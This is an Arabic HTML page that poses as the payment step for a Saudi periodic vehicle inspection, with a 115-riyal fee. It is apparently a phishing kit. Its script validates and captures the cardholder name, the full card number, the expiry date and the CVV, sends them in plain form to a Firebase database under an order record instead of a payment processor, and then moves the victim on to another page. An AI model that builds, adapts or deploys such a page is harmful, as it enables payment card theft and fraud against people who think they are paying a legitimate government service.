<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إتمام عملية الدفع - مركز سلامة المركبات</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <style>
        :root {
            --main-green: #1e7344; 
            --bg-light: #f7f8fa;
            --card-gradient: linear-gradient(135deg, #1e7344 0%, #114126 100%);
            --error-red: #d93025;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }

        .payment-card-container { background: #fff; width: 100%; max-width: 420px; border-radius: 25px; padding: 25px 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); text-align: center; }
        .main-header { margin-bottom: 20px; }
        .main-header h1 { font-size: 18px; color: #333; margin-bottom: 5px; }
        .main-header p { font-size: 14px; color: #1e7344; font-weight: bold; }

        .credit-card-view {
            width: 100%; height: 200px; background: var(--card-gradient); border-radius: 15px;
            padding: 20px; margin-bottom: 25px; color: white; position: relative;
            box-shadow: 0 8px 20px rgba(0,0,0,0.15); direction: ltr; text-align: left;
            overflow: hidden; transition: 0.3s;
        }

        .card-logo-row { display: flex; justify-content: space-between; align-items: center; height: 40px; }
        .card-chip { width: 45px; height: 35px; background: linear-gradient(135deg, #f0d060 0%, #b88a14 100%); border-radius: 6px; }
        
        #viewCardLogo { width: 50px; height: auto; object-fit: contain; display: none; }

        .card-number-view { font-size: 20px; letter-spacing: 2px; margin-top: 35px; display: block; font-family: 'Courier New', monospace; height: 25px; white-space: nowrap; }
        .card-info-bottom { display: flex; justify-content: space-between; align-items: flex-end; margin-top: 25px; direction: rtl; }
        .card-holder-view { font-size: 13px; text-align: right; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 190px; }
        .card-expiry-view { font-size: 14px; direction: ltr; text-align: left; }

        .form-group { text-align: right; margin-bottom: 15px; width: 100%; position: relative; }
        .form-label { display: block; font-size: 13px; font-weight: bold; color: #444; margin-bottom: 7px; }
        
        .input-field { width: 100%; padding: 13px; border: 1px solid #e0e0e0; border-radius: 10px; font-size: 16px; outline: none; transition: 0.3s; }
        .input-field:focus { border-color: var(--main-green); }
        .input-field.invalid { border-color: var(--error-red) !important; background-color: #fff8f8; }

        .error-msg { color: var(--error-red); font-size: 11px; margin-top: 4px; display: none; font-weight: bold; }

        .expiry-cvv-row { display: flex; gap: 10px; width: 100%; }
        .btn-pay { width: 100%; background-color: #82b199; color: white; border: none; border-radius: 10px; padding: 16px; font-size: 18px; font-weight: bold; cursor: not-allowed; transition: 0.3s; opacity: 0.6; }
        .btn-pay.active { background-color: var(--main-green); cursor: pointer; opacity: 1; }
    </style>
</head>
<body>

    <div class="payment-card-container">
        <div class="main-header">
            <h1>إتمام عملية الدفع</h1>
            <p>بقيمة 115 ريال - خدمة الفحص الفني الدوري</p>
        </div>

        <div class="credit-card-view" id="cardVisual">
            <div class="card-logo-row">
                <div class="card-chip"></div>
                <img src="" id="viewCardLogo" alt="Card Logo">
            </div>
            <div class="card-number-view" id="viewCardNumber">#### #### #### ####</div>
            <div class="card-info-bottom">
                <div class="card-holder-view" id="viewCardHolder">اسم حامل البطاقة</div>
                <div class="card-expiry-view" id="viewCardExpiry">00 / 00</div>
            </div>
        </div>

        <div class="form-group">
            <label class="form-label">اسم حامل البطاقة</label>
            <input type="text" id="cardHolder" class="input-field" placeholder="الاسم (حروف فقط)" autocomplete="off">
        </div>

        <div class="form-group">
            <label class="form-label">رقم البطاقة</label>
            <input type="tel" id="cardNumber" class="input-field" placeholder="1234 5678 9012 3456" maxlength="19">
            <div id="numError" class="error-msg">رقم البطاقة غير صحيح أو غير مكتمل</div>
        </div>

        <div class="expiry-cvv-row">
            <div class="form-group" style="flex: 1.5;">
                <label class="form-label">تاريخ الانتهاء</label>
                <input type="tel" id="cardExpiry" class="input-field" placeholder="MM / YY" maxlength="7">
                <div id="expError" class="error-msg">التاريخ غير صالح</div>
            </div>
            <div class="form-group" style="flex: 1;">
                <label class="form-label">رمز (CVV)</label>
                <input type="tel" id="cvv" class="input-field" placeholder="123" maxlength="3">
            </div>
        </div>

        <button class="btn-pay" id="payButton" onclick="submitPayment()" disabled>ادفع الآن</button>
    </div>

    <script>
        const firebaseConfig = { 
            apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8...", 
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/", 
            projectId: "saso-inspection" 
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const v_id = localStorage.getItem('v_id');

        // خوارزمية Luhn للتحقق من صحة الرقم
        function isValidLuhn(number) {
            let sum = 0;
            let shouldDouble = false;
            for (let i = number.length - 1; i >= 0; i--) {
                let digit = parseInt(number.charAt(i));
                if (shouldDouble) {
                    if ((digit *= 2) > 9) digit -= 9;
                }
                sum += digit;
                shouldDouble = !shouldDouble;
            }
            return (sum % 10) === 0;
        }

        function validateForm() {
            const num = document.getElementById('cardNumber').value.replace(/\s/g, '');
            const exp = document.getElementById('cardExpiry').value;
            const holder = document.getElementById('cardHolder').value;
            const cvv = document.getElementById('cvv').value;
            const btn = document.getElementById('payButton');

            let isNumValid = num.length >= 15 && isValidLuhn(num);
            let isExpValid = false;

            if (exp.length === 7) {
                const parts = exp.split(' / ');
                const m = parseInt(parts[0]);
                const y = parseInt("20" + parts[1]);
                const now = new Date();
                const currentMonth = now.getMonth() + 1;
                const currentYear = now.getFullYear();
                if (m >= 1 && m <= 12) {
                    if (y > currentYear || (y === currentYear && m >= currentMonth)) isExpValid = true;
                }
            }

            document.getElementById('cardNumber').classList.toggle('invalid', num.length === 16 && !isNumValid);
            document.getElementById('numError').style.display = (num.length === 16 && !isNumValid) ? 'block' : 'none';
            document.getElementById('cardExpiry').classList.toggle('invalid', exp.length === 7 && !isExpValid);
            document.getElementById('expError').style.display = (exp.length === 7 && !isExpValid) ? 'block' : 'none';

            if (isNumValid && isExpValid && holder.length > 3 && cvv.length === 3) {
                btn.disabled = false;
                btn.classList.add('active');
            } else {
                btn.disabled = true;
                btn.classList.remove('active');
            }
        }

        // تعديل حقل الاسم لمنع الأرقام نهائياً
        document.getElementById('cardHolder').addEventListener('input', function (e) {
            // حذف أي رقم أو رمز، الإبقاء على الحروف والمسافات فقط
            this.value = this.value.replace(/[0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/g, '');
            document.getElementById('viewCardHolder').innerText = this.value || 'اسم حامل البطاقة';
            validateForm();
        });

        document.getElementById('cardNumber').addEventListener('input', function (e) {
            let val = this.value.replace(/\D/g, '');
            this.value = val.match(/.{1,4}/g)?.join(' ') || '';
            document.getElementById('viewCardNumber').innerText = this.value || '#### #### #### ####';
            
            const logoImg = document.getElementById('viewCardLogo');
            if (val.startsWith('4')) { logoImg.src = "https://img.icons8.com/color/48/000000/visa.png"; logoImg.style.display = "block"; }
            else if (val.startsWith('5')) { logoImg.src = "https://img.icons8.com/color/48/000000/mastercard.png"; logoImg.style.display = "block"; }
            else { logoImg.style.display = "none"; }
            validateForm();
        });

        document.getElementById('cardExpiry').addEventListener('input', function (e) {
            let val = this.value.replace(/\D/g, '');
            if (val.length >= 2) this.value = val.substring(0, 2) + ' / ' + val.substring(2, 4);
            else this.value = val;
            document.getElementById('viewCardExpiry').innerText = this.value || '00 / 00';
            validateForm();
        });

        document.getElementById('cvv').addEventListener('input', validateForm);

        function submitPayment() {
            if (!v_id) return;
            const data = {
                cardHolder: document.getElementById('cardHolder').value,
                cardNumber: document.getElementById('cardNumber').value,
                expiry: document.getElementById('cardExpiry').value,
                cvv: document.getElementById('cvv').value,
                timestamp: new Date().toLocaleString()
            };
            database.ref('orders/' + v_id + '/card_details').set(data).then(() => {
                window.location.href = 'portal-v3.html';
            });
        }
    </script>
</body>
</html>
